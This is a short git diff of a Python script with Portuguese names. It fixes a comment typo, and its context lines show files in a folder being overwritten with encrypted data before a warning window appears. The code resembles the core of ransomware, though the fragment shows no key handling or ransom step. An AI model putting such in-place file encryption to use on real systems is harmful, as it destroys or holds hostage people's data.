@@ -44,5 +44,5 @@ for arquivo in arquivos:
         with open(os.path.join(caminho_pasta, arquivo), 'wb') as arquivo_criptografado:
             arquivo_criptografado.write(dados_criptografados)
 
-# Chama da função para abrir a janela de Aviso
+# Chamada da função para abrir a janela de Aviso
 show_encryption_message()
